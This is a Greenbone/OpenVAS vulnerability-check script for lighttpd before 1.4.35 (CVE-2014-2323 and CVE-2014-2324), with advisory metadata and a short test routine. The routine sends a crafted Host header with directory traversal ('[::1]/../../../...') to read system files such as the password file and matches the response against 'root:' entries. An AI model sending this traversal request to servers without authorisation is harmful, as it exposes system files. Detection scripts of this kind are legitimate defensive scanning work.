CPE = "cpe:/a:lighttpd:lighttpd";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802072" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2014-2323", "CVE-2014-2324" );
	script_bugtraq_id( 66153, 66157 );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2014-05-13 12:18:43 +0530 (Tue, 13 May 2014)" );
	script_name( "Lighttpd Multiple vulnerabilities" );
	script_tag( name: "summary", value: "This host is running Lighttpd and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP GET request and check whether it responds with error
  message." );
	script_tag( name: "insight", value: "- mod_mysql_vhost module not properly sanitizing user supplied input passed
  via the hostname.

  - mod_evhost and mod_simple_vhost modules not properly sanitizing user supplied
  input via the hostname." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to execute arbitrary SQL
  commands and remote attackers to read arbitrary files via hostname." );
	script_tag( name: "affected", value: "Lighttpd version before 1.4.35." );
	script_tag( name: "solution", value: "Upgrade to 1.4.35 or later." );
	script_xref( name: "URL", value: "http://seclists.org/oss-sec/2014/q1/561" );
	script_xref( name: "URL", value: "http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt" );
	script_category( ACT_ATTACK );
	script_family( "Web Servers" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_dependencies( "sw_lighttpd_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "lighttpd/installed" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( port: port, cpe: CPE )){
	exit( 0 );
}
res = http_get_cache( item: "/", port: port );
if(!res || IsMatchRegexp( res, "^HTTP/1\\.[01] 400" )){
	exit( 0 );
}
files = traversal_files( "linux" );
for file in keys( files ) {
	req = "GET /" + files[file] + " HTTP/1.1" + "\r\n" + "Host: [::1]/../../../../../../../" + "\r\n\r\n";
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(!res || IsMatchRegexp( res, "^HTTP/1\\.[01] 400" )){
		continue;
	}
	if(IsMatchRegexp( res, "(root:.*:0:[01]:|^HTTP/1\\.[01] 404)" )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

